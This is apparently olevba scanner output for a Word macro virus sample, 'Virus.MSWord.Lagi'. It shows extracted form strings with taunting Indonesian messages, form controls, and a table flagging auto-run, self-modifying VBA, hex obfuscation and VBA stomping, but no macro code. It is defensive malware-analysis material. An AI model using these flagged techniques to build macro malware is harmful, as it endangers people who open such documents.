VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tapi Kali ini Gue Lagi Baek, elo gue maafin��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�maka elo harus ati-ati pisan, kanu virus komputer teh
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ya, mah. Aku Akan Berhati-hati lagiv5%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Okeylah
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� Baiklah�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yes Sir !!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PILIH DONG SATU YANG BENER JIKA SALAH SO TANGGUNG OLEH KAMU
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
System@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

